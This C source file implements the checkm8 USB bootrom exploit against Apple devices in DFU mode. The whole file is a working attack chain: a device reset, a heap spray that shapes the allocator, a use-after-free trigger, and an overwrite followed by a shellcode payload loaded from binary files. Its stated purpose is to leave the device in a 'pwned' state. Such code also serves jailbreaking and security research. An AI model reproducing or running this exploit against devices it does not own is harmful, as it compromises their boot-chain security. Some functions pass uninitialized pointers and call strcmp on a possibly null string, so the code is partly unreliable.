#include <exploit/exploit.h>

// Purpose: Trigger a DFU mode reset on the device
bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

// Purpose: Place the device into a stalled state
bool checkm8Stall(device_t *device)
{

    unsigned usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    usb_handle_t *handle = &device->handle;
    while (sendUSBControlRequestAsyncNoData(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && sendUSBControlRequestAsyncNoData(handle, 0x80, 6, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

// Purpose: Stall the device-to-host endpoint
bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// Purpose: Spray the heap in order to craft a hole for the IO buffer allocation
bool checkm8HeapSpray(device_t *device)
{
    // Stall the endpoint and leak a ZLP
    if (!checkm8Stall(device)) { return false; }
    LOG(LOG_DEBUG, "Stalled endpoint");

    int hole = 0x10;
    // Send non-leaking packets
    for (int i = 1; i <= hole; i++)
    {
        if (!checkm8NoLeak(device)) { return false; }
    }
    LOG(LOG_DEBUG, "Sent %d regular packets", hole);

    // Leak a ZLP
    if (!checkm8USBRequestLeak(device)) { return false; }
    LOG(LOG_DEBUG, "Sent ZLP-leaking packet");

    // Send non-leaking packet
    if (!checkm8NoLeak(device)) { return false; }
    LOG(LOG_DEBUG, "Sent regular packet");
    
    return true;
}

// Purpose: Trigger the use-after-free vulnerability
bool checkm8TriggerUaF(device_t *device)
{
    unsigned usb_abort_timeout = 10;
	transfer_ret_t transfer_ret;

	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < config_overwrite_pad 
        && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, 0x540 - transfer_ret.sz, &transfer_ret) 
        && transfer_ret.ret == USB_TRANSFER_STALL) {
			sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
			return true;
		}
		if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % 10;
	}
	return false;
}

// Purpose: Send the payload and overwrite to the device and trigger shellcode execution
bool checkm8SendPayload(device_t *device)
{
    FILE *overwriteFile = fopen("src/exploit/payloads/gaster/overwrite.bin", "rb");
    if (overwriteFile == NULL)
    {
        printf("Failed to open overwrite file");
        return false;
    }
    fseek(overwriteFile, 0, SEEK_END);
    size_t overwriteSize = ftell(overwriteFile);
    fseek(overwriteFile, 0, SEEK_SET);
    char *overwriteData = malloc(overwriteSize);
    fread(overwriteData, 1, overwriteSize, overwriteFile);
    fclose(overwriteFile);

    FILE *payloadFile = fopen("src/exploit/payloads/gaster/payload.bin", "rb");
    if (payloadFile == NULL)
    {
        printf("Failed to open payload file");
        return false;
    }
    fseek(payloadFile, 0, SEEK_END);
    size_t payloadSize = ftell(payloadFile);
    fseek(payloadFile, 0, SEEK_SET);
    char *payloadData = malloc(payloadSize);
    fread(payloadData, 1, payloadSize, payloadFile);
    fclose(payloadFile);

    transfer_ret_t transferRet;

    // Stall endpoint
    if (!checkm8USBRequestStall(device))
    {
        LOG(LOG_ERROR, "Failed to stall endpoint");
        return false;
    }

    LOG(LOG_DEBUG, "Stalled endpoint, leaked ZLP");

    // This was originally a leaking packet, doesn't seem to be necessary
    if (!checkm8USBRequestNoLeak(device))
    {
        LOG(LOG_ERROR, "Failed to send packet");
        return false;
    }

    LOG(LOG_DEBUG, "Sent regular packet");
    LOG(LOG_DEBUG, "Sending overwrite of size 0x%2X", overwriteSize);

    // Send the overwrite
    if (sendUSBControlRequest(&device->handle, 0, 0, 0, 0, overwriteData, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL))
    {
        LOG(LOG_DEBUG, "Sent overwrite");
        bool ret = true;
        size_t packetSize;
        int i;
        LOG(LOG_DEBUG, "Sending payload of size 0x%2X", payloadSize);

        // Send the payload
        for(i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            LOG(LOG_DEBUG, "Sending payload chunk of size 0x%2X", packetSize);
            ret = sendUSBControlRequest(&device->handle, 0x21, DFU_DNLOAD, 0, 0, &payloadData[i], packetSize, NULL);
        }
        if (ret) {
            LOG(LOG_DEBUG, "Sent payload, about to trigger execution");
        } else {
            LOG(LOG_ERROR, "Failed to send payload, transferred 0x%2X of 0x%2X bytes", i, payloadSize);
            return false;
        }
    } else {
        LOG(LOG_ERROR, "Failed to send overwrite");
        return false;
    }
    free(overwriteData);
    free(payloadData);

    return true;
}

// Purpose: Check if the device has been successfully exploited
int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumberIOKit(&device->handle));
}

// Purpose: Get the device into DFU mode
int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device, false);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to place device into recovery mode");
        getchar();
        LOG(LOG_INFO, "Placing device into recovery mode");
        if (enterRecoveryMode() != 0) {
            LOG(LOG_ERROR, "Failed to place device with udid %s into recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        // TODO: DFU helper
        LOG(LOG_INFO, "Waiting for device to enter DFU mode");
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_FATAL, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber))
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    
    return 0;
}

char *stageToString(int stage) {
    switch (stage) {
        case STAGE_RESET:
            return "Reset";
        case STAGE_HEAP_SPRAY:
            return "Heap spray";
        case STAGE_TRIGGER:
            return "UaF trigger";
        case STAGE_PATCH:
            return "Patching";
        case STAGE_DONE:
            return "Done";
        default:
            return "Unknown";
    }
}

int checkm8()
{
    device_t device;
    initUSBHandle(&device.handle, 0x5ac, 0x1227);
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_FATAL, "Failed to prepare device");
        return -1;
    }

    bool pwned, ret;
    struct timespec start, end;

    LOG_NO_NEWLINE(LOG_INFO, "Press enter to exploit device");
    getchar();

    LOG(LOG_DEBUG, "Serial number: %s", getDeviceSerialNumberIOKit(&device.handle));

    int stage = STAGE_RESET;
    int stageForLogging = STAGE_RESET;
    char *finalSerial = NULL;
    LOG(LOG_DEBUG, "Starting timer");
    clock_gettime(CLOCK_MONOTONIC, &start);
    while (stage != STAGE_DONE && waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned)) {
        if (!pwned) {
            if (stage == STAGE_RESET) {
                LOG(LOG_INFO, "Resetting device");
                ret = checkm8Reset(&device);
                stage = STAGE_HEAP_SPRAY;
                stageForLogging = STAGE_RESET;
            }
            else if (stage == STAGE_HEAP_SPRAY) {
                LOG(LOG_INFO, "Spraying the heap");
                ret = checkm8HeapSpray(&device);
                stage = STAGE_TRIGGER;
                stageForLogging = STAGE_HEAP_SPRAY;
            }
            else if (stage == STAGE_TRIGGER) {
                LOG(LOG_INFO, "Triggering UaF");
                ret = checkm8TriggerUaF(&device);
                stage = STAGE_PATCH;
                stageForLogging = STAGE_TRIGGER;
            }
            else {
                LOG(LOG_INFO, "Patching");
                ret = checkm8SendPayload(&device);
                stageForLogging = STAGE_PATCH;
                // Try to re-init so serial number is updated
                resetUSBHandle(&device.handle);
                closeUSBHandle(&device.handle);
                waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned);
                if (isSerialNumberPwned(getDeviceSerialNumberWithTransfer(&device.handle))) {
                    finalSerial = getDeviceSerialNumberWithTransfer(&device.handle);
                    pwned = true;
                }
                stage = STAGE_DONE;
            }

            if (ret) {
                LOG(LOG_SUCCESS, "%s completed successfully", stageToString(stageForLogging));
            } else {
                LOG(LOG_FATAL, "%s failed", stageToString(stageForLogging));
                if (stage != STAGE_PATCH) {
                    stage = STAGE_RESET;
                }
            }
            resetUSBHandle(&device.handle);
        }
           
        closeUSBHandle(&device.handle);
    }
    LOG(LOG_DEBUG, "Stopping timer");
    clock_gettime(CLOCK_MONOTONIC, &end);
    if (!pwned) { LOG(LOG_FATAL, "Exploit failed"); }
    else {
        LOG(LOG_SUCCESS, "Exploit succeeded");
        double timeTaken = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
        LOG(LOG_INFO, "Exploited in %.2f seconds", timeTaken);
    }
    if (strcmp(finalSerial, "(null)") != 0) { LOG(LOG_INFO, "Serial number: %s", finalSerial); }
    return 0;
}
